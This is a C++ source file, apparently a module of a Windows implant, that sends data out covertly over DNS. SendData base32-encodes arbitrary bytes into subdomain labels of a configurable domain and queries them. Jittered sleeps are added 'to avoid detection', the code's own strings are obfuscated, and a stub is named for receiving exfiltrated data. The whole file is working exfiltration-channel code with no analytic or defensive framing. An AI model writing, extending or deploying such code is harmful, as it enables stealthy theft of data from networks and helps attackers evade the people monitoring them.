// src/communication/DnsComms.cpp
#include "communication/DnsComms.h"
#include "core/Logger.h"
#include "core/Configuration.h"
#include "security/Obfuscation.h"   
#include "utils/StringUtils.h"
#include "utils/NetworkUtils.h"
#include "utils/TimeUtils.h"
#include <windows.h>
#include <windns.h>
#include <vector>
#include <sstream>
#include <cstdint>
#include <string>

#pragma comment(lib, "dnsapi.lib")

// Obfuscated strings
static const auto OBF_DNS_COMMS = OBFUSCATE("DnsComms");

DnsComms::DnsComms(Configuration* config)
    : m_config(config), m_dnsServer("8.8.8.8") {}

DnsComms::~DnsComms() {
    Cleanup();
}

bool DnsComms::Initialize() {
    // Parse DNS server from configuration if available
    std::string server = m_config->GetValue("dns_server", "8.8.8.8");
    m_dnsServer = server;
    
    LOG_INFO("DNS communication initialized with server: " + server);
    return true;
}

bool DnsComms::SendData(const std::vector<uint8_t>& data) {
    // Encode data as base32 for DNS compatibility
    std::string encodedData = utils::StringUtils::Base32Encode(data);
    
    // Split into chunks for DNS labels (max 63 bytes per label)
    std::vector<std::string> chunks;
    for (size_t i = 0; i < encodedData.length(); i += 50) {
        chunks.push_back(encodedData.substr(i, 50));
    }

    bool overallSuccess = true;
    
    for (const auto& chunk : chunks) {
        // Create DNS query with data as subdomain
        std::string query = chunk + "." + m_config->GetValue("dns_domain", "research.example.com");
        
        DNS_STATUS status = DnsQuery_A(
            query.c_str(),
            DNS_TYPE_A,
            DNS_QUERY_STANDARD,
            NULL,
            NULL,
            NULL
        );

        if (status != 0) {
            LOG_DEBUG("DNS query failed: " + std::to_string(status));
            overallSuccess = false;
        }

        // Add delay between queries to avoid detection
        utils::TimeUtils::JitterSleep(100, 0.3);
    }

    return overallSuccess;
}

void DnsComms::Cleanup() {
    LOG_DEBUG("DNS communication cleaned up");
}

bool DnsComms::TestConnection() const {
    // Test DNS resolution
    PDNS_RECORD dnsRecord;
    DNS_STATUS status = DnsQuery_A(
        "google.com",
        DNS_TYPE_A,
        DNS_QUERY_STANDARD,
        NULL,
        &dnsRecord,
        NULL
    );

    if (status == 0) {
        DnsRecordListFree(dnsRecord, DnsFreeRecordList);
        return true;
    }
    
    return false;
}

std::vector<uint8_t> DnsComms::ReceiveData() {
    // Implement DNS data exfiltration reception
    // This would typically involve running a DNS server
    return std::vector<uint8_t>();
}